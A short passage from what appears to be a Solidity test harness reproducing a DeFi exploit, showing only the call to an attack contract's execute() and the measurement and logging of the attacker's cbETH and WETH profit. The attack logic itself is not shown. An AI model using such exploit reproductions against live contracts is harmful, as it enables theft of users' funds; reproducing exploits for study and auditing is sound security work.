        attack.execute();

        uint256 cbEthProfit = IERC20(CBETH).balanceOf(ATTACKER) - cbEthBefore;
        uint256 wethProfit = IERC20(WETH_TOKEN).balanceOf(ATTACKER) - wethBefore;
        logTokenBalance(CBETH, ATTACKER, "Attacker cbETH profit");
